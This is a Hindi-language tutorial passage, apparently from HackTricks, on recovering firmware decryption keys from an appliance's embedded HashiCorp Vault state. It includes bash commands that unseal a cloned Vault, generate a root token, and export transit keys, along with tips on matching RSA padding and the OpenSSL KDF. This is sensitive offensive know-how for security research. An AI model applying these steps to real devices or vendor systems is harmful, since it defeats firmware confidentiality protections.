## Embedded KMS/Vault state से firmware decryption keys वापस प्राप्त करना

जब कोई update image छोटे plaintext metadata को बड़े high-entropy blob के साथ मिलाती है, तो brute-forcing से पहले container triage करें:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` और `binwalk -E` से headers, offsets और line boundaries dump करें।
- `Salted__` आम तौर पर OpenSSL `enc` format दर्शाता है: अगले 8 bytes salt होते हैं और बाकी bytes ciphertext।
- अगर कोई Base64 field decode होकर ठीक `256` bytes की हो, तो यह एक मज़बूत संकेत है कि आप random firmware password/session key को wrap करने वाले RSA-2048 ciphertext को देख रहे हैं।
- उसी file में मौजूद detached PGP material अक्सर केवल authenticity की रक्षा करता है; यह न मानें कि वही confidentiality mechanism है।

अगर static key hunting (`grep`, `strings`, PEM/PGP searches) विफल हो जाए, तो केवल private keys खोजने के बजाय **operational decrypt path** को reverse करें:

- Updater / management binary को decompile करें और पता लगाएँ कि encrypted blob कौन पढ़ता है, कौन-सा helper/API उसे unwrap करता है और वह किस logical key name का अनुरोध करता है।
- Extracted root filesystem में KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) के साथ unit files और init scripts खोजें।
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens या local KMS auto-unseal scripts को private-key material के बराबर मानें।

अगर appliance में original Vault binary और storage backend मौजूद हों, तो Vault internals को फिर से implement करने के बजाय उस environment को replay करना आम तौर पर आसान होता है:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

KMS के cloned संस्करण पर root access के साथ:

- Transit keys को केवल isolated clone के अंदर exportable बनाएँ: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key export करें: `vault read transit/export/encryption-key/<name>`
- Recovered RSA key को KMS द्वारा इस्तेमाल किए गए सटीक padding/hash pair के साथ आज़माएँ। PKCS#1 v1.5 decrypt का विफल होना और default OAEP decrypt का विफल होना इस बात का प्रमाण **नहीं** है कि key गलत है; Vault-backed कई flows में SHA-256 के साथ OAEP इस्तेमाल होता है, जबकि आम libraries में default SHA-1 होता है।
- अगर payload `Salted__` से शुरू होता है, तो AES-CBC decryption आज़माने से पहले vendor के OpenSSL KDF (`EVP_BytesToKey`, legacy appliances में अक्सर MD5) को हूबहू दोहराएँ।

इससे "encrypted firmware" एक अधिक सामान्य समस्या बन जाता है: **appliance-side operational keys recover करें, फिर offline unwrap + KDF parameters को हूबहू दोहराएँ**।

## प्रशिक्षण और प्रमाणपत्र

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude के साथ Firmware Cracking: वरिष्ठ-स्तर का कौशल, कनिष्ठ-स्तर की स्वायत्तता](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things पर हमले करने की निर्णायक मार्गदर्शिका](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [छोड़े जा चुके hardware में zero days का फायदा उठाना – Trail of Bits ब्लॉग](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [एक $20 के Smart Device ने मुझे आपके घर तक पहुँच कैसे दी](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [अब आप mi को देख सकते हैं: अब आप Pwned हैं](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector के charge port connector से उसका फायदा उठाना - भाग 2: anti-downgrade को bypass करना](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [इसे Blink करें: Philips Hue Bridge का Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
